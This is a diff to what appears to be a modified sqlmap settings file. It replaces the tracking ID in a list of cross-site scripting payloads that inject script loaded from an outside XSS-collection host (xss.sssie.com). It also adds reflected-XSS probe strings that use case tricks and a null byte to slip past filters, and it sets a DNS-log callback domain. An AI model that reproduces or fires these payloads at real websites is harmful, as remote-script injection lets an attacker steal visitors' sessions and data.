@@ -20,12 +20,17 @@ from lib.core.revision import getRevisionNumber
 
 # sqlmap version (<major>.<minor>.<month>.<monthly commit>)
 CLOUDEYE = ".776252.dnslog.info"
-XSSPAYLOAD =['''"><img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.sssie.com/UhnCfl';>''',
-             '''<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.sssie.com/UhnCfl';>''',
-             '''"><script src=http://xss.sssie.com/UhnCfl></script>''',
-             '''<script src=http://xss.sssie.com/UhnCfl></script>''',
-             '''</textarea>'"><script src=http://xss.sssie.com/UhnCfl></script>''']
+XSSPAYLOAD =['''"><img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.sssie.com/mdBL8b';>''',
+             '''<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.sssie.com/mdBL8b';>''',
+             '''"><script src=http://xss.sssie.com/mdBL8b></script>''',
+             '''<script src=http://xss.sssie.com/mdBL8b></script>''',
+             '''</textarea>'"><script src=http://xss.sssie.com/mdBL8b></script>''']
 
+ReflectXSSPAYLOAD = ['''><sCrIpt>aLeRt(18567)</ScRipt>''',
+                     '''"/><script>alErt(18567)</script><!--''',
+                     '''<img src='1' onerror=alErt(18567)/>''',
+                     '''<i\x00mg src='1' onerror=alErt(18567)/>''',
+                     '''"><body onload=alert(18567)>"''']
 VERSION = "1.0.6.47"
 REVISION = getRevisionNumber()
 STABLE = VERSION.count('.') <= 2
